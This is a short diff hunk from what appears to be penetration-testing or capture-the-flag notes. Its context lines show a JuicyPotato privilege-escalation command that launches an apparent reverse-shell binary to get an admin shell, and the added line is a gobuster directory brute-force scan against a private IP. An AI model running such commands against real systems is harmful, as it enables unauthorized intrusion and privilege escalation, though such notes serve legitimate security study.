@@ -40,6 +40,10 @@ JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rev.exe -
 This gives admin privilege shell. 
 
 
+gobuster dir -u http://10.10.4.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 60 -o scans.txt
+
+
+
 
 
 
